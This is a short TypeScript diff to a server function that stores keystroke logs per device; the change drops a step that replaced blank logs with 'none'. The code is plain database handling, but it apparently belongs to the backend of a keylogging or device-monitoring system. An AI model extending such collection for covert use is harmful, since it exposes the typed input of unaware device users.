@@ -8,14 +8,10 @@ export const addNewKeyLogs = async (data: any) => {
 	try {
 		const { deviceId, keyLogsType, keylogs, event } = data;
 
-		// Check if keylogs is an empty string, and assign 'none' if it is
-		const sanitizedKeylogs =
-			keylogs && keylogs.trim() !== "" ? keylogs : "none";
-
 		const newKeyLog: KeyLogsModelType = new KeyLogs({
 			deviceId,
 			keyLogsType,
-			keylogs: sanitizedKeylogs,
+			keylogs: keylogs,
 			keyevent: event,
 		});
 
